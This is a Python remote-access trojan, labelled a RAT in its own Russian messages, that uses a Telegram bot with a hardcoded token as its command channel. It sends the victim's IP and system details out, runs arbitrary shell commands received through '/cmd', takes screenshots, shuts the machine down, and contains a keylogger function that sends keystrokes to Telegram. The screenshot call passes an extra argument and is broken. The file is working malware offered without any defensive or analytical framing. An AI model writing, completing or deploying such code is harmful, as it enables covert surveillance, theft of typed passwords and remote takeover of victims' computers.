import os
import time
import requests
import subprocess
import platform
import pyautogui
from pynput import keyboard

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

def screenshot():
    try:
        path = "screen.png"
        pyautogui.screenshot().save(path)
        return path
    except:
        return None

def execute_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return r.stdout + r.stderr
    except:
        return "Ошибка"

def keylogger():
    logs = ""
    def on_press(key):
        nonlocal logs
        try:
            logs += key.char
        except:
            logs += f"[{key}]"
        if len(logs) > 50:
            send_tg(f"⌨️ Кейлог: {logs}")
            logs = ""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def main():
    ip = requests.get("https://api.ipify.org").text
    send_tg(f"🖥️ RAT запущен!\nIP: {ip}\nСистема: {platform.system()} {platform.release()}")

    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            updates = requests.get(url).json()
            if updates['result']:
                last = updates['result'][-1]
                msg = last['message']['text']
                chat = last['message']['chat']['id']
                if str(chat) == CHAT_ID:
                    if msg.startswith('/cmd'):
                        out = execute_cmd(msg[5:])
                        send_tg(f"💻 Результат:\n{out[:4000]}")
                    elif msg == '/screen':
                        img = screenshot()
                        if img:
                            send_tg("📸 Скриншот:", img)
                            os.remove(img)
                        else:
                            send_tg("❌ Ошибка скриншота")
                    elif msg == '/shutdown':
                        execute_cmd("shutdown /s /t 5")
                        send_tg("💻 ПК выключается через 5 секунд!")
                    elif msg == '/altf4':
                        pyautogui.hotkey('alt', 'f4')
                        send_tg("⌨️ Alt+F4 отправлен!")
            time.sleep(5)
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
